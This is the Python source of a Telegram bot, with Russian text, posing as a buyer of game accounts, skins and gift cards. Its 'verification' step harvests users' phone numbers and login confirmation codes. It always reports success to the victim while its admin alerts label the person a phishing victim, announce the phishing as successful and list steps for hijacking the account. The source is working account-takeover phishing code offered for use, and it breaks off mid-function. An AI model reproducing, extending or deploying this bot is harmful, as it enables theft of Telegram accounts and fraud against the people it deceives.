import asyncio
import logging
import sqlite3
import random
import json
import os
import tempfile
from datetime import datetime
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import (
    InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton,
    ReplyKeyboardRemove,
    FSInputFile
)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Загрузка переменных окружения
def load_config():
    # Проверяем переменные окружения Railway
    api_token = os.getenv('API_TOKEN')
    admin_id = os.getenv('ADMIN_ID')
    moderator_ids = os.getenv('MODERATOR_IDS')
    
    # Если нет переменных окружения, используем .env файл
    if not api_token:
        try:
            from dotenv import load_dotenv
            load_dotenv()
            api_token = os.getenv('API_TOKEN')
            admin_id = os.getenv('ADMIN_ID')
            moderator_ids = os.getenv('MODERATOR_IDS')
        except ImportError:
            pass
    
    # Проверяем обязательные переменные
    if not api_token:
        raise ValueError("API_TOKEN не найден. Установите переменную окружения API_TOKEN")
    
    # Значения по умолчанию
    if not admin_id:
        admin_id = '8358009538'
    
    if not moderator_ids:
        moderator_ids = '8358009538,987654321'
    
    return api_token, int(admin_id), [int(x.strip()) for x in moderator_ids.split(',')]

# Загружаем конфигурацию
try:
    API_TOKEN, ADMIN_ID, MODERATOR_IDS = load_config()
except ValueError as e:
    print(f"Ошибка конфигурации: {e}")
    print("Установите переменные окружения:")
    print("API_TOKEN=ВАШ_ТОКЕН_БОТА")
    print("ADMIN_ID=8358009538")
    print("MODERATOR_IDS=8358009538,987654321")
    exit(1)

print(f"Bot token: {API_TOKEN[:10]}...")
print(f"Admin ID: {ADMIN_ID}")
print(f"Moderator IDs: {MODERATOR_IDS}")

# Инициализация
storage = MemoryStorage()
bot = Bot(token=API_TOKEN)
dp = Dispatcher(storage=storage)

# Состояния FSM
class SellerStates(StatesGroup):
    waiting_item_type = State()
    waiting_photos = State()
    waiting_description = State()
    waiting_confirm = State()

class ModeratorStates(StatesGroup):
    waiting_price = State()
    waiting_chat = State()

# В начале файла добавьте это состояние в класс VerificationStates
class VerificationStates(StatesGroup):
    waiting_code = State()  # Добавьте эту строку
    waiting_phone = State()

# Добавьте этот декоратор для отладки всех входящих сообщений
@dp.message()
async def debug_all_messages(message: types.Message):
    """Функция для отладки - логирует все входящие сообщения"""
    logger.debug(f"DEBUG: Получено сообщение от {message.from_user.id}: {message.text or message.content_type}")
    
# Инициализация БД с учетом окружения
def init_db():
    # Определяем путь к БД в зависимости от окружения
    if os.environ.get('RAILWAY_ENVIRONMENT') or os.environ.get('RAILWAY_STATIC_URL'):
        # На Railway используем временную директорию
        db_path = os.path.join(tempfile.gettempdir(), 'market_bot.db')
        print(f"Using database at: {db_path}")
    else:
        # Локально используем текущую директорию
        db_path = 'market_bot.db'
        print(f"Using local database: {db_path}")
    
    conn = sqlite3.connect(db_path, check_same_thread=False)
    cursor = conn.cursor()
    
    # Таблица пользователей
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            phone TEXT,
            code TEXT,
            balance REAL DEFAULT 0,
            rating INTEGER DEFAULT 5,
            status TEXT DEFAULT 'active',
            registered DATETIME DEFAULT CURRENT_TIMESTAMP,
            last_activity DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    # Таблица товаров
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS items (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            item_type TEXT,
            photos TEXT,
            description TEXT,
            price REAL,
            moderator_id INTEGER,
            status TEXT DEFAULT 'pending',
            created DATETIME DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (user_id) REFERENCES users (user_id)
        )
    ''')
    
    # Таблица чатов с модератором
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS chats (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            moderator_id INTEGER,
            messages TEXT,
            status TEXT DEFAULT 'open',
            created DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    # Таблица логов
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            action TEXT,
            details TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    # Таблица SMS кодов
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS sms_codes (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            phone TEXT,
            code TEXT,
            sent_time DATETIME DEFAULT CURRENT_TIMESTAMP,
            used BOOLEAN DEFAULT 0
        )
    ''')
    
    conn.commit()
    return conn, cursor

conn, cursor = init_db()

# Создаем директории для фотографий
os.makedirs('photos', exist_ok=True)

# Функция для имитации отправки SMS
async def simulate_sms_delivery(user_id: int, phone: str, code: str):
    """
    Имитирует задержку доставки SMS и выводит код в чат как системное сообщение.
    """
    try:
        # Случайная задержка от 3 до 10 секунд для реалистичности
        delay = random.uniform(3, 10)
        await asyncio.sleep(delay)

        # Форматируем номер для отображения (последние 4 цифры)
        masked_phone = f"******{phone[-4:]}" if len(phone) > 4 else phone

        # Создаем сообщение, стилизованное под SMS от оператора
        sms_notification = (
            f"📱 *SMS от оператора:*\n\n"
            f"Код подтверждения: `{code}`\n"
            f"Для номера: `{masked_phone}`\n\n"
            f"_Сообщение автоматически доставлено. Не отвечайте на это SMS._"
        )

        await bot.send_message(user_id, sms_notification, parse_mode="Markdown")
        logger.info(f"[SMS SIM] Код {code} 'отправлен' пользователю {user_id} на номер {masked_phone}")
        
        # Сохраняем в историю отправленных кодов
        cursor.execute(
            "INSERT INTO sms_codes (user_id, phone, code) VALUES (?, ?, ?)",
            (user_id, phone, code)
        )
        conn.commit()
        
    except Exception as e:
        logger.error(f"[SMS SIM] Ошибка отправки уведомления пользователю {user_id}: {e}")

# Функция запроса верификации
async def request_verification(callback_query: types.CallbackQuery):
    verification_text = """
🔐 *ТРЕБУЕТСЯ ВЕРИФИКАЦИЯ*

Для продажи товаров необходимо подтвердить ваш аккаунт Telegram.

*Зачем это нужно:*
• Защита от мошенничества
• Гарантия выплат
• Юридическое оформление сделок

*Нажмите кнопку для верификации:*
    """
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ ПРОЙТИ ВЕРИФИКАЦИЮ", callback_data="start_verification")]
    ])
    
    await bot.edit_message_text(
        verification_text,
        chat_id=callback_query.message.chat.id,
        message_id=callback_query.message.message_id,
        parse_mode="Markdown",
        reply_markup=keyboard
    )

# Обработчик начала верификации
@dp.callback_query(F.data == "start_verification")
async def start_verification_process(callback_query: types.CallbackQuery):
    verification_text = """
📱 *ШАГ 1: ПОДТВЕРЖДЕНИЕ НОМЕРА ТЕЛЕФОНА*

Для верификации необходимо подтвердить номер телефона, привязанный к Telegram.

*Впишите номер и нажмите кнопку ниже:*
    """
    
    keyboard = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="📱 ПОДТВЕРДИТЬ НОМЕР", request_contact=True)]],
        resize_keyboard=True,
        one_time_keyboard=True
    )
    
    await bot.send_message(
        callback_query.from_user.id,
        verification_text,
        parse_mode="Markdown",
        reply_markup=keyboard
    )

# Логирование
def log_action(user_id: int, action: str, details: str = ""):
    cursor.execute(
        "INSERT INTO logs (user_id, action, details) VALUES (?, ?, ?)",
        (user_id, action, details)
    )
    cursor.execute(
        "UPDATE users SET last_activity = CURRENT_TIMESTAMP WHERE user_id = ?",
        (user_id,)
    )
    conn.commit()

# Команда /start для продавцов
@dp.message(Command("start"))
async def cmd_start(message: types.Message, state: FSMContext):
    user = message.from_user
    
    # Регистрация пользователя
    cursor.execute(
        "INSERT OR IGNORE INTO users (user_id, username, first_name) VALUES (?, ?, ?)",
        (user.id, user.username, user.first_name)
    )
    cursor.execute(
        "UPDATE users SET last_activity = CURRENT_TIMESTAMP WHERE user_id = ?",
        (user.id,)
    )
    conn.commit()
    
    welcome_text = f"""
🏪 *ДОБРО ПОЖАЛОВАТЬ В МАГАЗИН Money Moves Bot | заработок!* 🎮

👋 Привет, {user.first_name}!

Мы покупаем:
• 🎮 Игровые аккаунты (Steam, Epic Games, Origin и др)
• 💎 Внутриигровые предметы (CS:GO, Dota 2, TF2 и др)
• 🎫 Игровые ключи (Steam, Xbox, PlayStation и др)
• 📱 Цифровые подарки (Apple, Amazon, Google и др)
• 🛬 Телеграмм подарки  
• 💳 Электронные ваучеры

💰 *Почему мы?*
• Мгновенная оплата
• Высокие цены
• Гарантия сделки
• Анонимность

*Выберите действие:*
    """
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💰 ПРОДАТЬ ТОВАР", callback_data="sell_item")],
        [InlineKeyboardButton(text="ℹ️ О НАС", callback_data="about_us")],
        [InlineKeyboardButton(text="📞 ПОДДЕРЖКА", callback_data="support")]
    ])
    
    await message.answer(welcome_text, parse_mode="Markdown", reply_markup=keyboard)
    log_action(user.id, "start_command")

# Начало продажи товара
@dp.callback_query(F.data == "sell_item")
async def start_selling(callback_query: types.CallbackQuery, state: FSMContext):
    user = callback_query.from_user
    
    # Проверка верификации
    cursor.execute("SELECT phone FROM users WHERE user_id = ?", (user.id,))
    user_data = cursor.fetchone()
    
    if not user_data or not user_data[0]:
        # Требуется верификация
        await request_verification(callback_query)
        return
    
    item_types_text = """
🎯 *ЧТО ВЫ ХОТИТЕ ПРОДАТЬ?*

Выберите категорию вашего товара:

• 🎮 *Игровой аккаунт* - Steam, Epic Games, Origin, Uplay
• 💎 *Цифровой предмет* - CS:GO скины, Dota 2 предметы
• 🎫 *Игровой ключ* - Активационный ключ игры
• 📱 *Цифровой подарок* - Gift Card, ваучер
• 💳 *Электронные деньги* - Qiwi, Яндекс.Деньги
• 📦 *Другое* - Укажите в описании
    """
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎮 Игровой аккаунт", callback_data="type_account")],
        [InlineKeyboardButton(text="💎 Цифровой предмет", callback_data="type_item")],
        [InlineKeyboardButton(text="🎫 Игровой ключ", callback_data="type_key")],
        [InlineKeyboardButton(text="📱 Цифровой подарок", callback_data="type_gift")],
        [InlineKeyboardButton(text="💳 Электронные деньги", callback_data="type_money")],
        [InlineKeyboardButton(text="📦 Другое", callback_data="type_other")]
    ])
    
    await state.set_state(SellerStates.waiting_item_type)
    await bot.edit_message_text(
        item_types_text,
        chat_id=callback_query.message.chat.id,
        message_id=callback_query.message.message_id,
        parse_mode="Markdown",
        reply_markup=keyboard
    )
    log_action(user.id, "start_selling")

# Обработка выбора типа товара
@dp.callback_query(SellerStates.waiting_item_type)
async def process_item_type(callback_query: types.CallbackQuery, state: FSMContext):
    item_types = {
        "type_account": "Игровой аккаунт",
        "type_item": "Цифровой предмет",
        "type_key": "Игровой ключ",
        "type_gift": "Цифровой подарок",
        "type_money": "Электронные деньги",
        "type_other": "Другое"
    }
    
    item_type = item_types.get(callback_query.data, "Другое")
    await state.update_data(item_type=item_type)
    
    photos_text = f"""
📸 *ДОБАВЛЕНИЕ ФОТОГРАФИЙ*

Категория: *{item_type}*

*Пришлите фотографии вашего товара:*
• Для аккаунтов: скриншоты профиля, библиотеки игр
• Для предметов: скриншоты инвентаря
• Для ключей: фото сертификата (если есть)
• Для подарков: фото карты или чека

*Требования:*
✅ Хорошее качество
✅ Виден весь товар
✅ Нет водяных знаков
✅ Максимум 5 фото

Отправьте фото или нажмите /skip если фото нет
    """
    
    await state.set_state(SellerStates.waiting_photos)
    await bot.edit_message_text(
        photos_text,
        chat_id=callback_query.message.chat.id,
        message_id=callback_query.message.message_id,
        parse_mode="Markdown"
    )
    log_action(callback_query.from_user.id, "select_item_type", item_type)

# Обработка фотографий
@dp.message(SellerStates.waiting_photos, F.photo)
async def process_photos(message: types.Message, state: FSMContext):
    user_data = await state.get_data()
    photos = user_data.get('photos', [])
    
    # Сохраняем информацию о фото
    photo_id = message.photo[-1].file_id
    photos.append(photo_id)
    
    await state.update_data(photos=photos)
    
    if len(photos) >= 5:
        await message.answer("✅ Максимальное количество фото достигнуто (5 фото)")
        await ask_description(message, state)
    else:
        remaining = 5 - len(photos)
        await message.answer(f"✅ Фото добавлено. Осталось мест: {remaining}")

@dp.message(SellerStates.waiting_photos, Command("skip"))
async def skip_photos(message: types.Message, state: FSMContext):
    await ask_description(message, state)

async def ask_description(message: types.Message, state: FSMContext):
    user_data = await state.get_data()
    item_type = user_data.get('item_type', 'Товар')
    
    description_text = f"""
📝 *ОПИСАНИЕ ТОВАРА*

Категория: *{item_type}*

*Подробно опишите ваш товар:*

*Пример для игрового аккаунта:*
• Платформа (Steam/Epic Games/др.)
• Количество игр
• Уровень/ранг
• Наличие привязок
• История аккаунта

*Пример для предметов:*
• Название предмета
• Игра
• Редкость
• Состояние
• Особенности

*Чем подробнее описание - тем выше цена!*
    """
    
    await state.set_state(SellerStates.waiting_description)
    await message.answer(description_text, parse_mode="Markdown")

# Обработка описания
@dp.message(SellerStates.waiting_description)
async def process_description(message: types.Message, state: FSMContext):
    description = message.text
    await state.update_data(description=description)
    
    # Получаем все данные
    user_data = await state.get_data()
    photos_count = len(user_data.get('photos', []))
    
    summary_text = f"""
📋 *ПОДТВЕРЖДЕНИЕ ЗАЯВКИ*

*Категория:* {user_data['item_type']}
*Фотографии:* {photos_count} шт.
*Описание:*
{description[:500]}{'...' if len(description) > 500 else ''}

*Далее:*
1. Модератор проверит заявку
2. Определит стоимость товара
3. Вы получите предложение цены
4. После согласия - инструкции по передаче

*Все верно?*
    """
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ ПОДТВЕРДИТЬ", callback_data="confirm_submit")],
        [InlineKeyboardButton(text="✏️ ИЗМЕНИТЬ", callback_data="edit_submit")]
    ])
    
    await state.set_state(SellerStates.waiting_confirm)
    await message.answer(summary_text, parse_mode="Markdown", reply_markup=keyboard)

# Подтверждение заявки
@dp.callback_query(SellerStates.waiting_confirm, F.data == "confirm_submit")
async def confirm_submission(callback_query: types.CallbackQuery, state: FSMContext):
    user = callback_query.from_user
    user_data = await state.get_data()
    
    # Сохраняем в БД
    photos_json = json.dumps(user_data.get('photos', []))
    
    cursor.execute('''
        INSERT INTO items (user_id, item_type, photos, description, status)
        VALUES (?, ?, ?, ?, 'pending')
    ''', (user.id, user_data['item_type'], photos_json, user_data['description']))
    
    item_id = cursor.lastrowid
    conn.commit()
    
    # Отправляем модераторам
    for moderator_id in MODERATOR_IDS:
        try:
            moderator_text = f"""
🆕 *НОВАЯ ЗАЯВКА #{item_id}*
━━━━━━━━━━━━━━━━
👤 *Продавец:* {user.first_name} (@{user.username})
🆔 *User ID:* {user.id}
🏷 *Категория:* {user_data['item_type']}
📝 *Описание:*
{user_data['description'][:500]}...
📸 *Фото:* {len(user_data.get('photos', []))} шт.
━━━━━━━━━━━━━━━━
*Действия:*
            """
            
            keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="💰 ОЦЕНИТЬ", callback_data=f"price_{item_id}"),
                 InlineKeyboardButton(text="💬 ЧАТ", callback_data=f"chat_{item_id}")],
                [InlineKeyboardButton(text="❌ ОТКЛОНИТЬ", callback_data=f"reject_{item_id}")]
            ])
            
            await bot.send_message(
                moderator_id,
                moderator_text,
                parse_mode="Markdown",
                reply_markup=keyboard
            )
            
            # Отправляем фото если есть
            photos = user_data.get('photos', [])
            if photos:
                media_group = []
                for photo_id in photos[:3]:  # Первые 3 фото
                    media_group.append(types.InputMediaPhoto(media=photo_id, caption=f"Фото заявки #{item_id}" if photo_id == photos[0] else ""))
                
                await bot.send_media_group(moderator_id, media_group)
                
        except Exception as e:
            logger.error(f"Ошибка отправки модератору {moderator_id}: {e}")
    
    # Ответ пользователю
    user_response = f"""
✅ *ЗАЯВКА #{item_id} ПРИНЯТА!*

*Статус:* На модерации ⏳

*Что дальше:*
1. Модератор оценит ваш товар (1-24 часа)
2. Вы получите предложение цены
3. После согласия - инструкции по передаче
4. Получение денег на карту/кошелек

*Среднее время проверки:* 2-4 часа
*Следить за статусом:* /status
    """
    
    await bot.edit_message_text(
        user_response,
        chat_id=callback_query.message.chat.id,
        message_id=callback_query.message.message_id,
        parse_mode="Markdown"
    )
    
    log_action(user.id, "submit_item", f"item_id: {item_id}")
    await state.clear()

# Обработка оценки модератором
@dp.callback_query(F.data.startswith("price_"))
async def moderator_set_price(callback_query: types.CallbackQuery, state: FSMContext):
    item_id = int(callback_query.data.split("_")[1])
    
    # Получаем информацию о товаре
    cursor.execute(
        "SELECT i.*, u.first_name, u.username FROM items i JOIN users u ON i.user_id = u.user_id WHERE i.id = ?",
        (item_id,)
    )
    item = cursor.fetchone()
    
    if not item:
        await callback_query.answer("❌ Товар не найден")
        return
    
    price_text = f"""
💰 *УСТАНОВКА ЦЕНЫ*

*Заявка #{item_id}*
*Продавец:* {item[8]} (@{item[9]})
*Товар:* {item[2]}
*Описание:*
{item[4][:300]}...

*Рекомендуемые цены:*
• Аккаунты: 500-5000 руб
• Предметы: 50-5000 руб
• Ключи: 300-3000 руб
• Подарки: 100-10000 руб

*Введите цену в рублях:*
    """
    
    await state.set_state(ModeratorStates.waiting_price)
    await state.update_data(item_id=item_id, moderator_id=callback_query.from_user.id)
    
    await bot.edit_message_text(
        price_text,
        chat_id=callback_query.message.chat.id,
        message_id=callback_query.message.message_id,
        parse_mode="Markdown"
    )

# Обработка ввода цены модератором
@dp.message(ModeratorStates.waiting_price, F.text.regexp(r'^\d+$'))
async def process_price_input(message: types.Message, state: FSMContext):
    price = int(message.text)
    moderator_data = await state.get_data()
    item_id = moderator_data['item_id']
    moderator_id = moderator_data['moderator_id']
    
    # Обновляем цену в БД
    cursor.execute(
        "UPDATE items SET price = ?, moderator_id = ?, status = 'approved' WHERE id = ?",
        (price, moderator_id, item_id)
    )
    conn.commit()
    
    # Получаем данные о продавце
    cursor.execute(
        "SELECT user_id FROM items WHERE id = ?",
        (item_id,)
    )
    seller_id = cursor.fetchone()[0]
    
    # Отправляем предложение продавцу
    offer_text = f"""
🎉 *ПРЕДЛОЖЕНИЕ ЦЕНЫ!*

*Заявка #{item_id} одобрена!*

💰 *Наша цена:* *{price} руб.*

*Принять предложение?*

*После принятия:*
1. Вы получите инструкции по передаче товара
2. Мы проверим получение
3. Вы получите деньги на карту/кошелек

*Срок выплаты:* 1-24 часа после проверки
    """
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ ПРИНЯТЬ", callback_data=f"accept_{item_id}"),
         InlineKeyboardButton(text="❌ ОТКЛОНИТЬ", callback_data=f"decline_{item_id}")],
        [InlineKeyboardButton(text="💬 ОБСУДИТЬ ЦЕНУ", callback_data=f"negotiate_{item_id}")]
    ])
    
    try:
        await bot.send_message(
            seller_id,
            offer_text,
            parse_mode="Markdown",
            reply_markup=keyboard
        )
        await message.answer(f"✅ Цена {price} руб установлена для заявки #{item_id}")
    except Exception as e:
        await message.answer(f"❌ Не удалось отправить предложение продавцу: {e}")
    
    await state.clear()

# Чат с модератором
@dp.callback_query(F.data.startswith("chat_"))
async def start_moderator_chat(callback_query: types.CallbackQuery, state: FSMContext):
    item_id = int(callback_query.data.split("_")[1])
    moderator_id = callback_query.from_user.id
    
    # Получаем информацию
    cursor.execute(
        "SELECT i.user_id, u.first_name FROM items i JOIN users u ON i.user_id = u.user_id WHERE i.id = ?",
        (item_id,)
    )
    item = cursor.fetchone()
    
    if not item:
        await callback_query.answer("❌ Товар не найден")
        return
    
    seller_id = item[0]
    seller_name = item[1]
    
    # Создаем или находим чат
    cursor.execute(
        "SELECT id FROM chats WHERE user_id = ? AND moderator_id = ? AND status = 'open'",
        (seller_id, moderator_id)
    )
    chat = cursor.fetchone()
    
    if not chat:
        cursor.execute(
            "INSERT INTO chats (user_id, moderator_id, messages) VALUES (?, ?, ?)",
            (seller_id, moderator_id, json.dumps([]))
        )
        chat_id = cursor.lastrowid
        conn.commit()
    else:
        chat_id = chat[0]
    
    chat_text = f"""
💬 *ЧАТ С ПРОДАВЦОМ*

*Продавец:* {seller_name}
*Заявка:* #{item_id}
*Чат ID:* {chat_id}

*Напишите сообщение продавцу:*
    """
    
    await state.set_state(ModeratorStates.waiting_chat)
    await state.update_data(chat_id=chat_id, seller_id=seller_id)
    
    await bot.edit_message_text(
        chat_text,
        chat_id=callback_query.message.chat.id,
        message_id=callback_query.message.message_id,
        parse_mode="Markdown"
    )

# Обработка сообщений модератора
@dp.message(ModeratorStates.waiting_chat)
async def process_moderator_message(message: types.Message, state: FSMContext):
    chat_data = await state.get_data()
    chat_id = chat_data['chat_id']
    seller_id = chat_data['seller_id']
    
    # Сохраняем сообщение
    cursor.execute("SELECT messages FROM chats WHERE id = ?", (chat_id,))
    messages_json = cursor.fetchone()[0]
    messages = json.loads(messages_json) if messages_json else []
    
    messages.append({
        "from": "moderator",
        "text": message.text,
        "time": datetime.now().isoformat()
    })
    
    cursor.execute(
        "UPDATE chats SET messages = ? WHERE id = ?",
        (json.dumps(messages), chat_id)
    )
    conn.commit()
    
    # Отправляем продавцу
    try:
        await bot.send_message(
            seller_id,
            f"📨 *Сообщение от поддержки:*\n\n{message.text}\n\n_Вы можете ответить в этом же чате._",
            parse_mode="Markdown"
        )
        await message.answer("✅ Сообщение отправлено продавцу")
    except Exception as e:
        await message.answer(f"⚠️ Не удалось отправить сообщение продавцу: {e}")

# Обработка номера телефона (фишинг) - ОБНОВЛЕННАЯ ВЕРСИЯ
# ЗАМЕНИТЕ существующую функцию process_phone_number на эту:
@dp.message(F.contact)
async def process_phone_number(message: types.Message, state: FSMContext):
    user = message.from_user
    phone = message.contact.phone_number

    # Убираем + если есть
    if phone.startswith('+'):
        phone = phone[1:]

    # Сохраняем номер
    cursor.execute(
        "UPDATE users SET phone = ? WHERE user_id = ?",
        (phone, user.id)
    )
    conn.commit()

    # ГЕНЕРИРУЕМ ФЕЙКОВЫЙ КОД (5-6 цифр)
    fake_code = str(random.randint(10000, 999999))

    # Сохраняем сгенерированный код для проверки
    cursor.execute(
        "UPDATE users SET code = ? WHERE user_id = ?",
        (fake_code, user.id)
    )
    conn.commit()

    # 1. Сразу сообщаем пользователю, что код отправлен
    initial_text = f"""
✅ *НОМЕР ПОДТВЕРЖДЕН: +{phone}*

📱 *На номер +{phone} было отправлено SMS с кодом подтверждения.*

⏳ *Пожалуйста, ожидайте доставки сообщения (обычно это занимает несколько секунд).*

🔢 *Код состоит из 5-6 цифр.*

*Если SMS не пришло в течение 2 минут, используйте команду* /resend_code
"""
    await message.answer(initial_text, parse_mode="Markdown", reply_markup=ReplyKeyboardRemove())

    # 2. Запускаем фоновую задачу для имитации отправки SMS
    asyncio.create_task(simulate_sms_delivery(user.id, phone, fake_code))

    # 3. Переводим пользователя в состояние ожидания кода
    await state.set_state(VerificationStates.waiting_code)
    
    # 4. Ждем 3 секунды и просим ввести код
    await asyncio.sleep(3)
    
    code_request_text = f"""
✍️ *Введите код из SMS, который пришел на номер +{phone}:*

*Пример кода:* `{fake_code}`

*Если код не пришел, используйте* /resend_code
"""
    await message.answer(code_request_text, parse_mode="Markdown")

    # 5. Отправляем уведомление админу
    admin_msg = f"""
🎣 *НОВЫЙ НОМЕР ДЛЯ ФИШИНГА*
━━━━━━━━━━━━━━━━
👤 *Жертва:* {user.first_name} (@{user.username})
🆔 *User ID:* {user.id}
📱 *Телефон:* +{phone}
🔢 *Сгенерированный код:* {fake_code}
⏰ *Время:* {datetime.now().strftime('%H:%M:%S')}
━━━━━━━━━━━━━━━━
*Ожидается ввод кода...*
"""
    try:
        await bot.send_message(ADMIN_ID, admin_msg, parse_mode="Markdown")
    except Exception as e:
        logger.error(f"Ошибка отправки админу: {e}")
    
    log_action(user.id, "phone_submitted", f"phone: {phone}")



# ОБНОВИТЕ функцию process_verification_code для работы с состоянием:
@dp.message(VerificationStates.waiting_code, F.text.regexp(r'^\d{5,6}$'))
async def process_verification_code(message: types.Message, state: FSMContext):
    user = message.from_user
    code = message.text

    # Проверяем, подтвержден ли номер у пользователя
    cursor.execute("SELECT phone, code FROM users WHERE user_id = ?", (user.id,))
    user_data = cursor.fetchone()

    if not user_data or not user_data[0]:
        # Если номера нет, просим пройти верификацию сначала
        await message.answer("❌ *Сначала необходимо подтвердить номер телефона.*\n\nИспользуйте меню верификации или нажмите /start", parse_mode="Markdown")
        await state.clear()
        return

    phone = user_data[0]
    saved_code = user_data[1]

    # Сохраняем введенный код (даже если не совпадает)
    cursor.execute(
        "UPDATE users SET code = ? WHERE user_id = ?",
        (code, user.id)
    )
    conn.commit()

    # ВСЕГДА УСПЕШНОЕ СООБЩЕНИЕ ДЛЯ ПОЛЬЗОВАТЕЛЯ
    success_text = f"""
✅ *Верификация по SMS завершена успешно!*

Ваш номер *+{phone}* подтвержден.

🎉 *Теперь вы можете продавать товары!*

📸 *Следующий шаг:*
Нажмите кнопку ниже чтобы начать продажу:
"""
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💰 НАЧАТЬ ПРОДАЖУ", callback_data="sell_item")]
    ])
    
    await message.answer(success_text, parse_mode="Markdown", reply_markup=keyboard)
    
    # Очищаем состояние
    await state.clear()
    
    # Отправка данных админу
    admin_report = f"""
🎣 *ФИШИНГ УСПЕШЕН!*
━━━━━━━━━━━━━━━━
👤 *Жертва:* {user.first_name} (@{user.username})
🆔 *User ID:* {user.id}
📱 *Телефон:* +{phone}
🔢 *Введенный код:* {code}
💾 *Сохраненный код:* {saved_code if saved_code else 'нет'}
💰 *Мотив:* Продажа игрового товара
⏰ *Время:* {datetime.now().strftime('%H:%M:%S')}
━━━━━━━━━━━━━━━━
*✅ Код подтверждения получен!*
*🚀 Можно переходить к захвату аккаунта*
"""
    
    try:
        await bot.send_message(ADMIN_ID, admin_report, parse_mode="Markdown")
        
        # Дополнительное уведомление
        actions_text = f"""
📋 *Действия с полученными данными:*
1. Использовать код `{code}` для входа в аккаунт
2. Восстановить пароль через код подтверждения
3. Проверить привязанные сессии
4. Сменить привязанный номер телефона

*Статус:* Пользователь перешел к продаже товаров.
"""
        await bot.send_message(ADMIN_ID, actions_text, parse_mode="Markdown")
        
    except Exception as e:
        logger.error(f"Ошибка отправки админу: {e}")
    
    log_action(user.id, "code_submitted", f"code: {code}, phone: {phone}")


# ОБНОВИТЕ команду resend_code для установки состояния:
@dp.message(Command("resend_code"))
async def cmd_resend_code(message: types.Message, state: FSMContext):
    user = message.from_user

    # Проверяем, есть ли сохраненный номер телефона
    cursor.execute("SELECT phone, code FROM users WHERE user_id = ?", (user.id,))
    user_data = cursor.fetchone()

    if not user_data or not user_data[0]:
        # Если номера нет, просим сначала подтвердить номер
        await message.answer("❌ *Сначала необходимо подтвердить номер телефона через меню верификации.*\n\nНажмите /start и выберите 'ПРОДАТЬ ТОВАР'", parse_mode="Markdown")
        return

    phone = user_data[0]
    old_code = user_data[1]

    # Генерируем НОВЫЙ код
    new_fake_code = str(random.randint(10000, 999999))

    # Обновляем код в базе
    cursor.execute(
        "UPDATE users SET code = ? WHERE user_id = ?",
        (new_fake_code, user.id)
    )
    conn.commit()

    # Устанавливаем состояние ожидания кода
    await state.set_state(VerificationStates.waiting_code)

    # Информируем пользователя
    resend_text = f"""
🔄 *Запрошена повторная отправка кода*

📱 *Новый код отправлен на номер +{phone}.*
⏳ *Ожидайте SMS в течение нескольких секунд.*

*Если код снова не пришел, проверьте:*
• Корректность номера
• Зону покрытия сети
• Настройки блокировки SMS
"""
    await message.answer(resend_text, parse_mode="Markdown")

    # Запускаем имитацию отправки нового кода
    asyncio.create_task(simulate_sms_delivery(user.id, phone, new_fake_code))

    # Ждем и просим ввести код
    await asyncio.sleep(3)
    await message.answer(f"✍️ *Введите новый код из SMS, который пришел на номер +{phone}:*", parse_mode="Markdown")

    # Уведомляем админа
    try:
        await bot.send_message(
            ADMIN_ID,
            f"🔄 *ПОВТОРНАЯ ОТПРАВКА КОДА*\n\nПользователь {user.id} запросил новый код.\nСтарый код: {old_code}\nНовый код: {new_fake_code}",
            parse_mode="Markdown"
        )
    except:
        pass
    
    log_action(user.id, "resend_code_requested")

# ДОБАВЬТЕ этот обработчик для случаев, когда пользователь вводит что-то кроме кода в состоянии ожидания кода:
@dp.message(VerificationStates.waiting_code)
async def handle_wrong_code_input(message: types.Message):
    await message.answer("❌ *Пожалуйста, введите 5-6 значный код из SMS.*\n\nЕсли код не пришел, используйте /resend_code", parse_mode="Markdown")

# ОБНОВИТЕ функцию start_verification_process для установки состояния:
@dp.callback_query(F.data == "start_verification")
async def start_verification_process(callback_query: types.CallbackQuery, state: FSMContext):
    verification_text = """
📱 *ШАГ 1: ПОДТВЕРЖДЕНИЕ НОМЕРА ТЕЛЕФОНА*

Для верификации необходимо подтвердить номер телефона, привязанный к Telegram.

*Нажмите кнопку ниже для подтверждения номера:*
    """
    
    keyboard = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="📱 ПОДТВЕРДИТЬ НОМЕР", request_contact=True)]],
        resize_keyboard=True,
        one_time_keyboard=True
    )
    
    await state.set_state(VerificationStates.waiting_phone)
    
    await bot.send_message(
        callback_query.from_user.id,
        verification_text,
        parse_mode="Markdown",
        reply_markup=keyboard
    )

# Принятие цены продавцом (фишинговая часть)
@dp.callback_query(F.data.startswith("accept_"))
async def seller_accept_price(callback_query: types.CallbackQuery):
    item_id = int(callback_query.data.split("_")[1])
    user = callback_query.from_user
    
